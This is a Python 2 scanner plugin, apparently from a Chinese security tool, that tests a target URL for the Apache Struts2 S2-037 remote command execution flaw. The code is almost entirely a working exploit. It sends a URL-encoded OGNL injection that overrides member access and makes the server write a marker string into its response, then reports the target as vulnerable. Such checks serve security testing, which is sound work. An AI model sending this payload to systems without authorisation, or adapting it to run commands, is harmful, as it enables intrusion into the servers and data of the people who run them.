#coding=utf-8
import requests
from lib import ttlscanlogger

def POC_INFO():
    dict_poc={};
    dict_poc["name"]="Struts2_037 RCE"
    dict_poc["Chinese_name"]="Struts2_037 远程命令执行漏洞"
    dict_poc["author"]="跳跳龙"
    return dict_poc



def POC(target_url):
    try:
        poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=tiaotiaolong_037"
        poc_url = target_url + poc

        response = requests.get(url=poc_url,timeout=0.5)
        result = response.text.encode('utf-8')
        # print result
        if 'tiaotiaolong_037' in result:
            if len(result) < 100:
                # print "发现一处struts漏洞，漏洞类型：struts2-037。漏洞地址为" + target_url
                ttlscanlogger.logger.error("[+]Vuln: {0} has found Struts2_037 vulnerabillity ".format(target_url))
                return True
            # print result
            else:
                # print "此处尚未发现struts2-037类型漏洞"
                return False
        else:
            # print "此处尚未发现struts2-037类型漏洞"
            return False
    except Exception, e:
        # print e
        return False